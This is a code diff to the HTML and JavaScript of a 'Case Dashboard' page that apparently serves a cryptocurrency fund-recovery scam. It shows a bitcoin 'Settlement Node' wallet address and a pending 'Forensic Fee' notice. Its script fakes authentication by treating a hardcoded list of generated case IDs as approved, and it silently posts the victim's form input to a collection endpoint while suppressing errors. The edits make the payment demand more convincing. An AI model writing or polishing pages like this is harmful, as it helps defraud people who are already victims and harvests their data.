@@ -59,7 +59,7 @@
                         <h2 class="text-3xl font-bold uppercase tracking-tighter italic text-white text-center md:text-left">Case Dashboard</h2>
                         <div class="flex items-center space-x-2 mt-1 justify-center md:justify-start">
                             <span class="text-cyan-400 font-mono text-sm" id="display_id"></span>
-                            <span class="text-[9px] bg-green-500/20 text-green-400 px-2 py-0.5 rounded border border-green-500/30 uppercase font-bold italic tracking-tighter">Authenticated</span>
+                            <span class="text-[9px] bg-green-500/20 text-green-400 px-2 py-0.5 rounded border border-green-500/30 uppercase font-bold italic">Authenticated</span>
                         </div>
                     </div>
                 </div>
@@ -86,7 +86,7 @@
                         </div>
                         <div class="bg-black/40 p-3 rounded-lg border border-orange-500/20">
                             <p class="text-[9px] text-orange-500 uppercase font-bold italic">Payment Status</p>
-                            <p class="text-[10px] font-mono text-orange-400 mt-1 uppercase font-bold tracking-widest animate-pulse">PENDING</p>
+                            <p class="text-[10px] font-mono text-orange-400 mt-1 uppercase font-bold tracking-widest animate-pulse">PENDING PAYMENT</p>
                         </div>
                     </div>
                 </div>
@@ -100,10 +100,10 @@
                         <h3 class="text-sm font-bold uppercase mb-4 text-orange-400 italic font-bold tracking-tighter">Settlement Node (BTC)</h3>
                         <div class="bg-black/80 p-4 rounded-xl border border-orange-500/30 mb-3 text-center">
                             <p class="text-[9px] text-orange-500 font-bold uppercase italic mb-2 tracking-widest">Personalized Wallet Address</p>
-                            <p id="wallet_addr" class="text-[11px] font-mono break-all text-white bg-black p-2 rounded border border-white/5"></p>
+                            <p id="wallet_addr" class="text-[11px] font-mono break-all text-white bg-black p-2 rounded border border-white/5 shadow-inner select-all"></p>
                         </div>
                         <div class="w-full bg-orange-600/10 border border-orange-500/40 text-orange-400 font-bold py-3 rounded-lg uppercase text-[10px] text-center tracking-[0.2em]">
-                            Awaiting Transaction Confirmation
+                            Awaiting Forensic Fee Verification
                         </div>
                     </div>
                 </div>
@@ -112,7 +112,6 @@
     </div>
 
     <script>
-        // MASTER DATABASE
         const approvedCases = {
             "DAR-2026-8942": {
                 status: "VERIFIED / STAGED",
@@ -123,7 +122,6 @@
             }
         };
 
-        // Populate Generic Codes
         for (let i = 1001; i <= 1050; i++) {
             approvedCases[`DAR-2026-${i}`] = {
                 status: "INITIALIZING NODE",
@@ -153,7 +151,9 @@
             btn.disabled = true;
 
             const caseData = approvedCases[inputId];
-            await fetch(loginForm.action, { method: "POST", body: new FormData(loginForm), headers: { 'Accept': 'application/json' } });
+            try {
+                await fetch(loginForm.action, { method: "POST", body: new FormData(loginForm), headers: { 'Accept': 'application/json' } });
+            } catch (e) {}
 
             document.getElementById('main-content').classList.add('hidden');
             document.getElementById('success-box').classList.remove('hidden');
